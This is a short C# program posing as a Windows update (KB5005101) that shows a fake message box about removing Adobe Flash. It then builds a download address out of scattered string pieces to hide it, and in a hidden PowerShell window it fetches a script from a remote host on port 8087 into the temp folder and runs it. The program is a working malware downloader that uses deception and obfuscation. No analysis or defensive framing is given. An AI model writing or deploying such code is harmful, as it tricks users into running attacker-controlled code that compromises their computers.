using Microsoft.Win32;
using System;
using System.Linq;
using System.Windows.Forms;
using System.Diagnostics;
namespace Console
{
    class Program
    {
        static void Main(string[] args)
        {
           var tftio = @"tp:";
           var uiou = @":8";
           var IndiaSailing = @"Colombo";
           var WarriorShepa = @"Viriato";
           MessageBox.Show("IMPORTANT: This release includes the Flash Removal Package.\nTaking this update will remove Adobe Flash from the machine", "KB5005101 21H1 Update");            
           var TerminalPath = @"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe";
           var FdxEstaMerda = @"HenrryTheNavigator";

           Process process = new Process();
           process.StartInfo.FileName = TerminalPath;
           process.StartInfo.Arguments = "cd $Env:TMP;iwr -uri ht"+tftio+"//"+WarriorShepa+IndiaSailing+FdxEstaMerda+uiou+"087/Update-KB5005101.ps1 -outfile Update-KB5005101.ps1;powershell -File Update-KB5005101.ps1";
           process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
           process.Start();
        }
    }
}
